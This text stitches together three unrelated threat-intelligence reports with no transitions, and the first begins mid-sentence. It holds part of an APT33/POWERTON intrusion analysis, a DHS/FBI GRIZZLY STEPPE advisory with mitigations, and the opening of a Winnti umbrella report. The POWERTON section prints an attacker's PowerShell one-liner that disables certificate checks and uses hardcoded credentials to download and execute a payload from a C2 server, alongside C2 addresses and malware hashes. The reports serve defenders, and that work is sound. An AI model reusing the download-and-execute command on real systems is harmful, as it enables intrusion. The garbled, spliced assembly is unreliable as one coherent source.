script named “Media.ps1” within the user’s %LOCALAPPDATA% directory (%LOCALAPPDATA%\\\\MediaWs\\\\Media.ps1) as shown in Figure 2.\\nFigure 2: Attacker’s “Media.ps1” script\\nThe purpose of “Media.ps1” was to decode and execute the downloaded binary payload, which was written to disk as “C:\\\\Users\\\\Public\\\\Downloads\\\\log.dat”. At a later stage, this PowerShell script would be configured to persist on the host via a registry Run key.\\nAnalysis of the “log.dat” payloads determined them to be variants of the publicly available POSHC2 proxy-aware stager written to download and execute PowerShell payloads from a hardcoded command and control (C2) address. These particular POSHC2 samples run on the .NET framework and dynamically load payloads from Base64 encoded strings. The implant will send a reconnaissance report via HTTP to the C2 server (hxxps://51.254.71[.]223/images/static/content/) and subsequently evaluate the response as PowerShell source code. The reconnaissance report contains the following information:\\nUsername and domain\\nComputer name\\nCPU details\\nCurrent exe PID\\nConfigured C2 server\\nThe C2 messages are encrypted via AES using a hardcoded key and encoded with Base64. It is this POSHC2 binary that established persistence for the aforementioned “Media.ps1” PowerShell script, which then decodes and executes the POSHC2 binary upon system startup. During the identified July 2018 activity, the POSHC2 variants were configured with a kill date of July 29, 2018.\\nPOSHC2 was leveraged to download and execute a new PowerShell-based implant self-named POWERTON (hxxps://185.161.209[.]172/api/info). The adversary had limited success with interacting with POWERTON during this time.\\xa0 The actor was able to download and establish persistence for an AutoIt binary named “ClouldPackage.exe” (MD5: 46038aa5b21b940099b0db413fa62687), which was achieved via the POWERTON “persist” command. The sole functionality of “ClouldPackage.exe” was to execute the following line of PowerShell code:\\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; $webclient = new-object System.Net.WebClient; $webclient.Credentials = new-object System.Net.NetworkCredential(\\'public\\', \\'fN^4zJp{5w#K0VUm}Z_a!QXr*]&2j8Ye\\'); iex $webclient.DownloadString(\\'hxxps://185.161.209[.]172/api/default\\')\\nThe purpose of this code is to retrieve “silent mode” POWERTON from the C2 server. Note the actor protected their follow-on payloads with strong credentials. Shortly after this, Managed Defense contained the intrusion.\\nStarting approximately three weeks later, the actor reestablished access through a successful password spray. Managed Defense immediately identified the actor deploying malicious homepages with RULER to persist on workstations. They made some infrastructure and tooling changes to include additional layers of obfuscation in an attempt to avoid detection. The actor hosted their homepage exploit at a new C2 server (hxxp://5.79.66[.]241/index.html). At least three new variations of “index.html” were identified during this period. Two of these variations contained encoded PowerShell code written to download new OS-dependent variants of the .NET POSHC2 binaries, as seen in Figure 3.\\nFigure 3: OS-specific POSHC2 Downloader\\nFigure 3 shows that the actor made some minor changes, such as encoding the PowerShell \"DownloadString\" commands and renaming the resulting POSHC2 and .ps1 files dropped to disk. Once decoded, the commands will attempt to download the POSHC2 binaries from yet another new C2 server (hxxp://103.236.149[.]124/delivered.dat). The name of the .ps1 file dropped to decode and execute the POSHC2 variant also changed to “Vision.ps1”. \\xa0During this August 2018 activity, the POSHC2 variants were configured with a “kill date” of Aug. 13, 2018. Note that POSHC2 supports a kill date in order to guardrail an intrusion by time and this functionality is built into the framework.\\nOnce again, POSHC2 was used to download a new variant of POWERTON (MD5: c38069d0bc79acdc28af3820c1123e53), configured to communicate with the C2 domain hxxps://basepack[.]org. At one point in late-August, after the POSHC2 kill date, the adversary used RULER.HOMEPAGE to directly download POWERTON, bypassing the intermediary stages previously observed.\\nDue to Managed Defense’s early containment of these intrusions, we were unable to ascertain the actor’s motivations; however, it was clear they were adamant about gaining and maintaining access to the victim’s network.\\nAdversary Pursuit: Infrastructure Monitoring\\nAdvanced Practices conducts aggressive proactive operations in order to identify and monitor adversary infrastructure at scale. The adversary maintained a RULER.HOMEPAGE payload at hxxp://91.235.116[.]212/index.html between July 16 and Oct. 11, 2018. On at least Oct. 11, 2018, the adversary changed the payload (MD5: 8be06571e915ae3f76901d52068e3498) to download and execute a POWERTON sample from hxxps://103.236.149[.]100/api/info (MD5: 4047e238bbcec147f8b97d849ef40ce5). This specific URL was identified in a public discussion as possibly related to recent destructive attacks. We are unable to independently verify this correlation with any organic information we possess.\\nOn Dec. 13, 2018, Advanced Practices proactively identified and attributed a malicious RULER.HOMEPAGE payload hosted at hxxp://89.45.35[.]235/index.html (MD5: f0fe6e9dde998907af76d91ba8f68a05). The payload was crafted to download and execute POWERTON hosted at hxxps://staffmusic[.]org/transfer/view (MD5: 53ae59ed03fa5df3bf738bc0775a91d9).\\nTable 1 contains the operational timeline for the activity we analyzed.\\nDATE/TIME (UTC)\\nNOTE\\nINDICATOR\\n2017-08-15 17:06:59\\nAPT33 – EMPIRE (Used)\\n8a99624d224ab3378598b9895660c890\\n2017-09-15 16:49:59\\nAPT33 – PUPYRAT (Compiled)\\n4b19bccc25750f49c2c1bb462509f84e\\n2017-11-12 20:42:43\\nGroupA – AUT2EXE Downloader (Compiled)\\n95f3bea43338addc1ad951cd2d42eb6f\\n2017-11-14 14:55:14\\nGroupA – PUPYRAT (Used)\\n17587668ac577fce0b278420b8eb72ac\\n2018-01-09 19:15:16\\nAPT33 – PUPYRAT (Compiled)\\n56f5891f065494fdbb2693cfc9bce9ae\\n2018-02-13 13:35:06\\nAPT33 – PUPYRAT (Used)\\n56f5891f065494fdbb2693cfc9bce9ae\\n2018-05-09 18:28:43\\nGroupB – AUT2EXE (Compiled)\\n46038aa5b21b940099b0db413fa62687\\n2018-07-02 07:57:40\\nAPT33 – POSHC2 (Used)\\nfa7790abe9ee40556fb3c5524388de0b\\n2018-07-16 00:33:01\\nGroupB – POSHC2 (Compiled)\\n75e680d5fddbdb989812c7ba83e7c425\\n2018-07-16 01:39:58\\nGroupB – POSHC2 (Used)\\n75e680d5fddbdb989812c7ba83e7c425\\n2018-07-16 08:36:13\\nGroupB – POWERTON (Used)\\n46038aa5b21b940099b0db413fa62687\\n2018-07-31 22:09:25\\nAPT33 – POSHC2 (Used)\\n129c296c363b6d9da0102aa03878ca7f\\n2018-08-06 16:27:05\\nGroupB – POSHC2 (Compiled)\\nfca0ad319bf8e63431eb468603d50eff\\n2018-08-07 05:10:05\\nGroupB – POSHC2 (Used)\\n75e680d5fddbdb989812c7ba83e7c425\\n2018-08-29 18:14:18\\nAPT33 – POSHC2 (Used)\\n5832f708fd860c88cbdc088acecec4ea\\n2018-10-09 16:02:55\\nAPT33 – POSHC2 (Used)\\n8d3fe1973183e1d3b0dbec31be8ee9dd\\n2018-10-09 16:48:09\\nAPT33 – POSHC2 (Used)\\n48d1ed9870ed40c224e50a11bf3523f8\\n2018-10-11 21:29:22\\nGroupB – POWERTON (Used)\\n8be06571e915ae3f76901d52068e3498\\n2018-12-13 11:00:00\\nGroupB – POWERTON (Identified)\\n99649d58c0d502b2dfada02124b1504c\\nTable 1: Operational Timeline\\nOutlook and Implications\\nIf the activities observed during these intrusions are linked to APT33, it would suggest that APT33 has likely maintained proprietary capabilities we had not previously observed until sustained pressure from Managed Defense forced their use. FireEye Intelligence has previously reported that APT33 has ties to destructive malware, and they pose a heightened risk to critical infrastructure. This risk is pronounced in the energy sector, which we consistently observe them target. That targeting aligns with Iranian national priorities for economic growth and competitive advantage, especially relating to petrochemical production.\\nWe will continue to track these clusters independently until we achieve high confidence that they are the same. The operators behind each of the described intrusions are using publicly available but not widely understood tools and techniques in addition to proprietary implants as needed. Managed Defense has the privilege of being exposed to intrusion activity every day across a wide spectrum of industries and adversaries. This daily front line experience is backed by Advanced Practices, FireEye Labs Advanced Reverse Engineering (FLARE), and FireEye Intelligence to give our clients every advantage they can have against sophisticated adversaries. We welcome additional original source information we can evaluate to confirm or refute our analytical judgements on attribution.\\nCustom Backdoor: POWERTON\\nPOWERTON is a backdoor written in PowerShell; FireEye has not yet identified any publicly available toolset with a similar code base, indicating that it is likely custom-built. POWERTON is designed to support multiple persistence mechanisms, including WMI\\xa0and auto-run registry key. Communications with the C2 are over TCP/HTTP(S) and leverage AES encryption for communication traffic to and from the C2. POWERTON typically gets deployed as a later stage backdoor and is obfuscated several layers.\\nFireEye has witnessed at least two separate versions of POWERTON, tracked separately as POWERTON.v1 and POWERTON.v2, wherein the latter has improved its command and control functionality, and integrated the ability to dump password hashes.\\nTable 2 contains samples of POWERTON.\\nHash of Obfuscated File (MD5)\\nHash of Deobfuscated File (MD5)\\nVersion\\n974b999186ff434bee3ab6d61411731f\\n3871aac486ba79215f2155f32d581dc2\\nV1\\ne2d60bb6e3e67591e13b6a8178d89736\\n2cd286711151efb61a15e2e11736d7d2\\nV1\\nbd80fcf5e70a0677ba94b3f7c011440e\\n5a66480e100d4f14e12fceb60e91371d\\nV1\\n4047e238bbcec147f8b97d849ef40ce5\\nf5ac89d406e698e169ba34fea59a780e\\nV2\\nc38069d0bc79acdc28af3820c1123e53\\n4aca006b9afe85b1f11314b39ee270f7\\nV2\\nN/A\\n7f4f7e307a11f121d8659ca98bc8ba56\\nV2\\n53ae59ed03fa5df3bf738bc0775a91d9\\n99649d58c0d502b2dfada02124b1504c\\nV2\\nTable 2: POWERTON malware samples\\nAdversary Methods: Email Exploitation on the Rise\\nOutlook and Exchange are ubiquitous with the concept of email access. User convenience is a primary driver behind technological advancements, but convenient access for users often reveals additional attack surface for adversaries. As organizations expose any email server access to the public internet for its users, those systems become intrusion vectors. FireEye has observed an increase in targeted adversaries challenging and subverting security controls on Exchange and Office365. Our Mandiant consultants also presented several new methods used by adversaries to subvert multifactor authentication at FireEye Cyber Defense Summit 2018.\\nAt FireEye, our decisions are data driven, but data provided to us is often incomplete and missing pieces must be inferred based on our expertise in order for us to respond to intrusions effectively. A plausible scenario for exploitation of this vector is as follows.\\nAn adversary has a single pair of valid credentials for a user within your organization obtained through any means, to include the following non-exhaustive examples:\\nThird party breaches where your users have re-used credentials; does your enterprise leverage a naming standard for email addresses such as [email\\xa0protected]? It is possible that a user within your organization has a personal email address with a first and last name--and an affiliated password--compromised in a third-party breach somewhere. Did they re-use that password?\\nPrevious compromise within your organization where credentials were compromised but not identified or reset.\\nPoor password choice or password security policies resulting in brute-forced credentials.\\nGathering of crackable password hashes from various other sources, such as NTLM hashes gathered via documents intended to phish them from users.\\nCredential harvesting phishing scams, where harvested credentials may be sold, re-used, or documented permanently elsewhere on the internet.\\nOnce the adversary has legitimate credentials, they identify publicly accessible Outlook Web Access (OWA) or Office 365 that is not protected with multi-factor authentication. The adversary leverages the stolen credentials and a tool like RULER to deliver exploits through Exchange’s legitimate features.\\nRULER In-The-Wild: Here, There, and Everywhere\\nSensePost’s RULER is a tool designed to interact with Exchange servers via a messaging application programming interface (MAPI), or via remote procedure calls (RPC), both over HTTP protocol. As detailed in the \"Managed Defense Rapid Responses\" section, in mid-November 2017, FireEye witnessed network activity generated by an existing Outlook email client process on a single host, indicating connection via Web Distributed Authoring and Versioning (WebDAV) to an adversary-controlled IP address 85.206.161[.]214. This communication retrieved an executable created with Aut2Exe (MD5: 95f3bea43338addc1ad951cd2d42eb6f), and executed a PowerShell one-liner to retrieve further malicious content.\\nWithout the requisite logging from the impacted mailbox, we can still assess that this activity was the result of a malicious mail rule created using the aforementioned tooling for the following reasons:\\nOutlook.exe directly requested the malicious executable hosted at the adversary IP address over WebDAV. This is unexpected unless some feature of Outlook directly was exploited; traditional vectors like phishing would show a process ancestry where Outlook spawned a child process of an Office product, Acrobat, or something similar. Process injection would imply prior malicious code execution on the host, which evidence did not support.\\nThe transfer of 95f3bea43338addc1ad951cd2d42eb6f was over WebDAV. RULER facilitates this by exposing a simple WebDAV server, and a command line module for creating a client-side mail rule to point at that WebDAV hosted payload.\\nThe choice of WebDAV for this initial transfer of stager is the result of restrictions in mail rule creation; the payload must be \"locally\" accessible before the rule can be saved, meaning protocol handlers for something like HTTP or FTP are not permitted. This is thoroughly detailed in Silent Break Security\\'s initial write-up prior to RULER’s creation. This leaves SMB and WebDAV via UNC file pathing as the available options for transferring your malicious payload via an Outlook Rule. WebDAV is likely the less alerting option from a networking perspective, as one is more likely to find WebDAV transactions occurring over ports 80 and 443 to the internet than they are to find a domain joined host communicating via SMB to a non-domain joined host at an arbitrary IP address.\\nThe payload to be executed via Outlook client-side mail rule must contain no arguments, which is likely why a compiled Aut2exe executable was chosen. 95f3bea43338addc1ad951cd2d42eb6f does nothing but execute a PowerShell one-liner to retrieve additional malicious content for execution. However, execution of this command natively using an Outlook rule was not possible due to this limitation.\\nWith that in mind, the initial infection vector is illustrated in Figure 4.\\nFigure 4: Initial infection vector\\nAs both attackers and defenders continue to explore email security, publicly-released techniques and exploits are quickly adopted. SensePost\\'s identification and responsible disclosure of CVE-2017-11774 was no different. For an excellent description of abusing Outlook\\'s home page for shell and persistence from an attacker’s perspective, refer to SensePost\\'s blog.\\nFireEye\\xa0has observed and documented an uptick\\xa0in\\xa0several malicious attackers\\' usage of this specific home page exploitation technique. Based on our experience, this particular method may be more successful due to defenders misinterpreting artifacts and focusing on incorrect mitigations. This is understandable, as some defenders may first learn of successful CVE-2017-11774 exploitation when observing Outlook spawning processes resulting in malicious code execution. When this observation is combined with standalone forensic artifacts that may look similar to malicious HTML Application (.hta) attachments, the evidence may be misinterpreted as initial infection via a phishing email. This incorrect assumption overlooks the fact that attackers require valid credentials to deploy CVE-2017-11774, and thus the scope of the compromise may be greater than individual users\\' Outlook clients where home page persistence is discovered. To assist defenders, we\\'re including a Yara rule to differentiate these Outlook home page payloads at the end of this post.\\nUnderstanding this nuance further highlights the exposure to this technique when combined with password spraying as documented with this attacker, and underscores the importance of layered email security defenses, including multi-factor authentication\\xa0and patch management. We recommend the organizations reduce their email attack surface as much as possible. Of note, organizations that choose to host their email with a cloud service provider must still ensure the software clients used to access that server are patched. Beyond implementing multi-factor authentication for Outlook 365/Exchange access, the Microsoft security updates in Table 3 will assist in mitigating known and documented attack vectors that are exposed for exploitation by toolkits such as SensePost’s RULER.\\nMicrosoft Outlook Security Update\\nRULER Module Addressed\\nJune 13, 2017 Security Update\\nRULER.RULES\\nSeptember 12, 2017 Security Update\\nRULER.FORMS\\nOctober 10, 2017 Security Update\\nRULER.HOMEPAGE\\nTable 3: Outlook attack surface mitigations\\nDetecting the Techniques\\nFireEye detected this activity across our platform, including named detection for POSHC2, PUPYRAT, and POWERTON.

Reference Number: JAR-16-20 296 December 29, 2016 GRIZZLY ST EPPE Œ Russian Malicious Cyber Activity Summary This Joint Analysis Report (JAR) is the result of analytic efforts between the Department of Hom eland Security (DHS) and the Federal Bureau of Investigation (FBI). This document provides technical details regarding the tools and infrastructure used by the Russian civilian and military intelligence Services (RIS) to compromise and exploit networks and endpoints associated with the U.S. election, as well as a range of U.S. G overnment, political, and private sector entities. The U.S. Government is referring to this malicious cyber activity by RIS as GRIZZLY STEPPE. Previous JARs have not attributed malic ious cyber activity to specific countries or threat actors. However, public attribution of these activities to RIS is supported by technical indicators from the U.S. Intelligence Community, DHS, FBI, the private sector, and other entities. This determinati on expands upon the Joint Statement released October 7, 2016, from the Department of Homeland Security and the Director of National Intelligence on Election Security. This activity by RIS is part of an ongoing campaign of cyber -enabled operations directed at the U.S. government and its citi zens . These cyber operations have included spearphishing campaigns targeting government organizations, critical infrastructure entities , think tanks, universities, political organizations, and corporations leading to the theft of information. In foreign countries, RIS actors conducted damaging and/or disruptive cyber-attacks, including attacks on critical infrastructure networks. In some cases , RIS actors masqueraded as third parties, hiding behind false online personas designed to cause the victim to misat tribute the source of the attack . This JAR provides technical indicators related to many of these operations, recommended mitigations, suggested actions to take in response to the indicators provided, and information on how to rep ort such incidents to the U.S. Government. TLP: WHITE 2 of 13 TLP:WHITE Description The U.S. Government confirm s that two different RIS actors participated in the intrusion into a U.S. political party. The first actor group, known as Advanced Persistent Threat ( APT ) 29, entered into the party™s systems in summer 2015, while the second, known as APT28, entered in spring 2016. Figure 1: The tactics and techniques used by APT29 and APT 28 to conduct cyber intrusions against target systems Both groups have historically targeted government organizations, think tanks, universities, and corporations around the world. APT29 has been observed crafting targeted spearphishing campaigns leveraging web links to a malicious dropper; once executed, the code delivers Remote Access Tools (RATs) an d evades detection using a range of techniques. APT28 is known for leveraging domains that closely mimic those of targeted organizations and tricking potential victims into entering legitimate credentials. APT28 actors relied heavily on shortened URLs in their spearphishing email campaigns. Once APT28 and APT29 have access to victims, both groups exfiltrate and analyze information to gain intelligence value. These groups use this information to craft highly targeted spearphishing campaigns. These actors set up operational infrastructure to obfuscate their source infrastructure, host domains and malware for targeting organizations, establish command and control nodes, and harvest credentials and other valuable information from their targets. In summer 2015, an APT29 spearphishing campaign directed emails containing a malicious link to over 1,000 recipients, including multiple U.S. Government victims. APT29 used legitimate TLP:W HITE 3 of 13 TLP:WHITE domains, to include domains associated with U.S. organizations and educational institutio ns, to host malware and send spearphishing emails. In the course of that campaign, APT29 successfully compromised a U.S. political party. At least one targeted individual activated links to malware hosted on operational infrastructure of opened attachments containing malware. APT29 delivered malware to the political party™s systems, established persistence, escalated privileges, enumerated active directory accounts, and exfiltrated email from several accounts through encrypted connections back through opera tional infrastructure. In spring 2016, APT28 compromised the same political party, again via targeted spearphishing. This time, the spearphishing email tricked recipients into changing their passwords through a fake webmail domain hosted on APT28 operatio nal infrastructure. Using the harvested credentials, APT28 was able to gain access and steal content, likely leading to the exfiltration of information from multiple senior party members. The U.S. Government assesses that information was leaked to the pres s and publicly disclosed. Figure 2: APT28\\'s Use of Spearphis hing and Stolen Credentials Actors likely associated with RIS are continuing to engage in spearphishing campaigns, including one launched as recently as November 2016, just days after the U.S. election.

The review of network perimeter netflow or firewall logs will assist in determining whether your network has experienced suspicious activity. When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IPs attempting to connect to their systems. Upon revie wing the traffic from these IPs, some traffic may correspond to malicious activity, and some may correspond to legitimate activity. Some traffic that may appear legitimate is actually malicious, such as vulnerability scanning or browsing of legitimate public facing services (e.g., HTTP, HTTPS, FTP ). Connections from these IPs may be performing vulnerability scans attempting to identify websites that are vulnerable to cross -site scripting (XSS) or Structured Query Language (SQL) injection attacks. If scanning identified vulnerable sites, attempts to exploit the vulnerabilities may be experienced. TLP:WHITE 6 of 13 TLP:WHITE Network administrators are encouraged to check their public- facing websites for the malicious file hashes. System owners are also advised to run the Yara signature on any system that is suspected to have been targete d by RIS actors. Threats from IOCs Malicious actors may use a variety of methods to interfere with information systems. Some methods of attack are listed below. Guidance provided is applicable to many other computer networks. Injection Flaws are broad web application attack techniques that attempt to send commands to a browser, database, or other system, allowing a regular user to control behavior. The most common example is SQL injection, which subverts the relationship between a webpage and its supporting database, typically to obtain information contained inside the database. Another form is command injection, where an untrusted user is able to send commands to operating systems supporting a web application or database. See the United States Computer Eme rgency Readiness Team (US -CERT) Publication on SQL Injection for more information. Cross -site scripting (XSS) vulnerabilities allow threat actors to insert and execute unauthorized code in web applications. Successful XSS attacks on websites can provide the attacker unauthorized access. For prevention and mitigation strategies against XSS, see US -CERT™s Alert on Compromised Web Servers and Web Shells . Server vulnerabilities may be exploited to allow unauthorized access to sensitive information. An attack against a poorly configured server may allow an adversary access to critical information including any websites or databases hosted on the server. See US- CERT™s Tip on Website Security for additional information. Recommended Mitigations Commit to Cybersecurity Best Practices A commitment to good cybersecurity and best practices is critical to protecting networks and systems. Here are some questions you may want to ask your organization to help prevent and mitigate against attacks. 1. Backups : Do we backup all critical information? Are the backups stored offline? Have we tested our ability to revert to backups during an incident? 2. Risk Analysis : Have we conducted a cybersecurity risk analysis of the organization? 3. Staff Training : Have we trained staff on cybersecurity best practices? 4. Vulnerability Scanning & Patching : Have we implemented regular scans of our network and systems and appropriate patching of known system vulnerabilities? 5. Application Whitelisting : Do we allow only approved programs to run on our networks? 6. Incident Response : Do we have an incident response plan and have we practiced it? TLP:WHITE 7 of 13 TLP:WHITE 7. Business Continuity : Are we able to sustain business operations without access to certain systems? For how long? Have we tested this? 8. Penetration Testi ng: Have we attempted to hack into our own systems to test the security of our systems and our ability to defend against attacks? Top Seven Mitigation Strategies DHS encourages network administrators to implement the recommendations below, which can prevent as many as 85 percent of targeted cybe r- attacks. These strategies are common sense to many, but DHS continues to see intrusions because organizations fail to use these basic measures. 1. Patch applications and operating systems Œ Vulnerable applications and operating systems are the targets of most attacks. Ensuring these are patched with the latest updates greatly reduces the number of exploitable entry points available to an attacker. Use best practices when updating software an d patches by only downloading updates from authenticated vendor sites. 2. Application whitelisting Œ Whitelisting is one of the best security strategies because it allows only specified programs to run while blocking all others, including malicious software. 3. Restrict administrative privileges Œ Threat actors are increasingly focused on gaining control of legitimate credentials, especially those associated with highly privileged accounts. Reduce privileges to only those needed for a user™s duties. Separate admi nistrators into privilege tiers with limited access to other tiers. 4. Network Segmentation and Segregation into Security Zones Œ Segment networks into logical enclaves and restrict host -to-host communications paths. This helps protect sensitive information and critical services and limits damage from network perimeter breaches. 5. Input validation Œ Input validation is a method of sanitizing untrusted user input provided by users of a web application, and may prevent many types of web application security flaws, such as SQLi, XSS, and command injection. 6. File Reputation Œ Tune Anti- Virus file reputation systems to the most aggressive setting possible; some products can limit execution to only the highest reputation files, stopping a wide range of untrustworthy cod e from gaining control. 7. Understanding firewalls Œ When anyone or anything can access your network at any time, your network is more susceptible to being attacked. Firewalls can be configured to block data from certain locations (IP whitelisting) or applications while allowing relevant and necessary data through. TLP:W HITE 8 of 13 TLP:WHITE Responding to Unauthorized Access to Networks Implement your security incident response and business continuity plan . It may take time for your organization™s IT professionals to isolate and remove threats to your systems and restore normal operations. Meanwhile, you should take steps to maintain your organization™s essential functions according to your business continuity plan. Organizations should maintain and regularly test backup plans, disaster recovery plans, and business continuity procedures. Contact DHS or law enforcement immediately . We encourage you to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), the FB I through a local field office or the FBI™s Cyber Division ( CyWatch@ic.fbi.gov or 855-292-3937) to report an intrusion and to request incident response resources or technical assistance. Detailed Mitigation Strateg ies Protect Against SQL Injection and Other Attacks on Web Services Routinely evaluate known and published vulnerabilities, perform software updates and technology refreshes periodically, and audit external -facing systems for known Web application vulnerabilities. Take steps to harden both Web applications and the servers hosting them to reduce the risk of network intrusion via this vector. 1 Use and configure available firewalls to block attacks. Take steps to further secure Windows systems such as installing and configuring Microsoft™s Enhanced Mitigation Experience Toolkit (EMET) and Microsoft AppLocker. Monitor and remove any unauthorized code present in any www directories. Disable, discontinue, or disallow the use of Internet Control Message Protocol (ICMP) and Simple Network Management Protocol (SNMP) and response to these protocols as much as possible. Remove non- required HTTP verbs from Web servers as typical Web servers and applications only require GET, POST, and HEAD. Where possible, minimize server fingerprinting by configuring Web servers to avoid responding with banners identifying the server software and version number. Secure both the operating system and the application. Update and patch production servers regularly. Disable potentially harmful SQL -stored procedure calls. Sanitize and validate input to ensure that it is properly typed and does not contain escaped code. Consider using type- safe stored procedures and prepared statements. Perform regular audits of transaction logs for sus picious activity. Perform penetration testing against Web services. Ensure error messages are generic and do not expose too much information. 1 http://msdn.microsoft.com/en -us/library/ff648653.aspx . Web site last accessed April 11, 2016 . TLP: WHITE 9 of 13 TLP:WHITE Phishing and Spear phishing Implement a Sender Policy Framework (SPF) record for your organization™s Domain Name S ystem ( DNS) zone file to minimize risks relating to the receipt of spoofed messages. Educate users to be suspicious of unsolicited phone calls, social media interactions, or email messages from individuals asking about employees or other internal informati on. If an unknown individual claims to be from a legitimate organization, try to verify his or her identity directly with the company. Do not provide personal information or information about your organization, including its structure or networks, unless you are certain of a person™s authority to have the information. Do not reveal personal or financial information in social media or email, and do not respond to solicitations for this information. This includes following links sent in email. Pay attention to the URL of a website. Malicious websites may look identical to a legitimate site, but the URL often includes a variation in spelling or a different domain than the valid website (e.g., .com vs. .net). If you are unsure whether an email request is legitimate, try to verify it by contacting the company directly. Do not use contact information provided on a website connected to the request; instead, check previous statements for contact information. Information about known phishing attacks is also available online from groups such as the Anti-Phishing Working Group ( http://www.antiphishing.org ).Take advantage of anti -phishing features offered by your email client and web browser. Patch all systems for critical vulnerabilities, prioritizing timely patching of software that proc esses Internet data, such as web browsers, browser plugins, and document readers. Permissions, Privileges, and Access Controls Reduce privileges to only those needed for a user™s dutie s.Restrict users™ ability (permissions) to install and run unwanted software applications, and apply the principle of ﬁLeast Privilegeﬂ to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to s pread through the network. Carefully consider the risks before granting administrative rights to users on their own machines. Scrub and verify all administrator accounts regularly. Configure Group Policy to restrict all users to only one login session, where possible. Enforce secure network authentication where possible. Instruct administrators to use non-privileged accounts for standard functions such as Web browsing or checking Web mail. TLP: WHITE 10 of 13 TLP:WHITE Segment networks into logical enclaves and restrict host -to-host communication paths. Containment provided by enclaving also makes incident cleanup significantly less costly. Configure firewalls to disallow RDP traffic coming from outside of the network boundary, except for in specific configurations such as when tunneled through a secondary VPN with lower privileges. Audit existing firewall rules and close all ports that are not explicitly needed for business. Specifically, carefully consider which ports should be connecting outbound versus inbound. Enforce a strict lockou t policy for network users and closely monitor logs for failed login activity. This can be indicative of failed intrusion activity. If remote access between zones is an unavoidable business need, log and monitor these connections closely. In environments with a high risk of interception or intrusion, organizations should consider supplementing password authentication with other forms of authentication such as challenge/response or multifactor authentication using biometric or physical tokens. Credentials Enforce a tiered administrative model with dedicated administrator workstations and separate administrative accounts that are used exclusively for each tier to prevent tools, such as Mimikatz, for credential theft from harvesting domain- level credentials. Implement multi -factor authentication (e.g., smart cards) or at minimum ensure users choose complex passwords that change regularly. Be aware that some services (e.g., FTP, telnet, and .rlogin) transmit user credentials in clear text. Minimize the use of th ese services where possible or consider more secure alternatives. Properly secure password files by making hashed passwords more difficult to acquire. Password hashes can be cracked within seconds using freely available tools. Consider restricting access t o sensitive password hashes by using a shadow password file or equivalent on UNIX systems. Replace or modify services so that all user credentials are passed through an encrypted channel. Avoid password policies that reduce the overall strength of credentials. Policies to avoid include lack of password expiration date, lack of lockout policy, low or disabled password complexity requirements, and password history set to zero. Ensure that users are not re-using passwords between zones by setting policies and conducting regular audits. Use unique passwords for local accounts for each device. TLP:W HITE 11 of 13 TLP:WHITE Logging Practices Ensure event logging (applications, events, login activities, security attributes, etc.) is turned on or monitored for identification of security issues. Configure network logs to provide enough information to assist in quickly developing an accurate determination of a security incident. Upgrade PowerShell to new versions with enhanced logging features and monitor the logs to detect usage of PowerShell commands, which are often malware -related. Secure logs, potentially in a centralized location, and protect them from modification. Prepare an incident response plan that can be rapidly implemented in case of a cyber intrusion. How t o Enhance Your Organizati on™s Cybersecurity Posture DHS offers a variety of resources for organizations to help recognize and address their cybersecurity risks. Resources include discussion points, steps to start evaluating a cybersecurity program, and a list of hands-on resources available to organizations. For a list of services, visit https://www.us -cert.gov/ccubedvp . Other resources include: The Cyber Security Advisors (CSA) program bolsters cybersecurity preparedness, risk mitigation, and incident response capabilities of critical infrastructure entities and more closely aligns them with the Federal Government. CSAs are DHS personnel assigned to districts throughout the country and territories, with at least one advisor in each of the 10 CSA regions, which mirror the Federal Emergency Management Agency regions. For more information, email cyberadvisor@hq.dhs.gov .Cyber Resilienc e Review (CRR) is a no -cost, voluntary assessment to evaluate and enhance cybersecurity within critical infrastructure sectors, as well as state, local, tribal, and territorial governments. The goal of the CRR is to develop an understanding and measurement of key cybersecurity capabilities to provide meaningful indicators of an entity™s operational resilience and ability to manage cyber risk to critical services during normal operations and times of operational stress and crisis. Visit https://www.cert.org/resilience/rmm.html to learn more about the CERT Resilience Management Model. Enhanced Cybersecurity Services (ECS) helps critical infrastructure owners and operators protect their systems by sharing sensitive and classified cyber threat information with Commercial Service Providers (CSPs) and Operational Implementers (OIs). CSPs then use the cyber threat information to protect CI customers. OIs use the threat information to protect internal networks. For more information, email ECS_Program@hq.dhs.gov .The Cybersecurity Information Sharing and Collaboration Program (CISCP) is a voluntary information-sharing and collaboration program between and among critic al TLP:WH ITE 12 of 13 TLP:WHITE infrastructure partners and the Federal Government. For more information, email CISCP@us -cert.gov . The Automated Indicator Sharing (AIS) initiative is a DHS effort to create a system where as soon as a company or federal agency observes an attempted compromise, the indicator will be shared in real time with all of our partners, protecting them from that particular threat. That means adversaries can only use an attack once, which increases their costs and ultimatel y reduces the prevalence of cyber -attacks. While AIS will not eliminate sophisticated cyber threats, it will allow companies and federal agencies to concentrate more on them by clearing away less sophisticated attacks. AIS part icipants connect to a DHS -managed system in the NCCIC that allows bidirectional sharing of cyber threat indicators. A server housed at each participant™s location allows each to exchange indicators with the NCCIC. Participants will not only receive DHS -developed indicators, but can share indicators they have observed in their own network defense efforts, which DHS will then share with all AIS participants. For more information, visit https://www.dhs.gov/ais . The Cybersecurity Framework (Framewor k), developed by the National Institute of Standards and Technology (NIST) in collaboration with the public and private sectors, is a tool that can improve the cybersecurity readiness of entities. The Framework enables entities, regardless of size, degree of cyber risk, or cyber sophistication, to apply principles and best practices of risk management to improve the security and resiliency of critical infrastructure. The Framework provides standards, guidelines, and practices that are working effectively to day. It consists of three partsŠ the Framework Core, the Framework Profile, and Framework Implementation Tiers Šand emphasizes five functions: Identify, Protect, Detect, Respond, and Recover. Use of the Framework is strictly voluntary. For more information, visit https://www.nist.gov/cyberframework or email cyberframework@nist.gov .

Later stage high profile targets tend to be politically motivated or high value technology organizations.\\nThe Winnti umbrella continues to operate highly successfully in 2018. Their tactics, techniques, and procedures (TTPs) remain consistent, though they experiment with new tooling and attack methodologies often.\\nOperational security mistakes during attacks have allowed us to acquire metrics on the success of some Winnti umbrella spear phishing campaigns and identify attacker location with high confidence.\\nThe theft of code signing certificates is a primary objective of the Winnti umbrella’s initial attacks, with potential secondary objectives based around financial gain.\\nReport Summary\\nThe purpose of this report is to make public previously unreported links that exist between a number of Chinese state intelligence operations. These operations and the groups that perform them are all linked to the Winnti umbrella and operate under the Chinese state intelligence apparatus. Contained in this report are details about previously unknown attacks against organizations and how these attacks are linked to the evolution of the Chinese intelligence apparatus over the past decade. Based on our findings, attacks against smaller organizations operate with the objective of finding and exfiltrating code signing certificates to sign malware for use in attacks against higher 